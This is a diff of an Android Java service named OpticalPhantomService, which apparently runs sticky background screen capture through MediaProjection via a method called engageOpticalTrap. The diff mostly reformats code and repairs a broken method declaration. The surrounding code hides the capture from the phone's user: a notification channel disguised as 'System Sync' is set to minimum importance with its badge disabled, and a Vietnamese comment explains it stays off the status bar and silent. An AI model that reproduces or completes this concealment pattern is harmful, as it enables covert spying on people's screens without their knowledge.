@@ -38,7 +38,9 @@ public class OpticalPhantomService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (mResultCode != -1 && mResultIntent != null) engageOpticalTrap(mResultCode, mResultIntent);
+        if (mResultCode != -1 && mResultIntent != null) {
+            engageOpticalTrap(mResultCode, mResultIntent);
+        }
         return START_STICKY;
     }
 
@@ -81,8 +83,7 @@ public class OpticalPhantomService extends Service {
         }, null);
     }
 
-    private void 
-        private void createNotificationChannel() {
+    private void createNotificationChannel() {
         // IMPORTANCE_MIN: Chỉ hiện dấu chấm nhỏ trong khay, KHÔNG hiện trên thanh Status Bar, KHÔNG có tiếng
         NotificationChannel channel = new NotificationChannel("OMEGA_VISION", "System Sync", NotificationManager.IMPORTANCE_MIN);
         channel.setShowBadge(false); // Tắt badge icon trên icon app
@@ -98,8 +99,13 @@ public class OpticalPhantomService extends Service {
                 .build();
     }
 
-    @Override public IBinder onBind(Intent intent) { return null; }
-    @Override public void onDestroy() {
+    @Override 
+    public IBinder onBind(Intent intent) { 
+        return null; 
+    }
+    
+    @Override 
+    public void onDestroy() {
         if (virtualDisplay != null) virtualDisplay.release();
         if (mediaProjection != null) mediaProjection.stop();
         super.onDestroy();
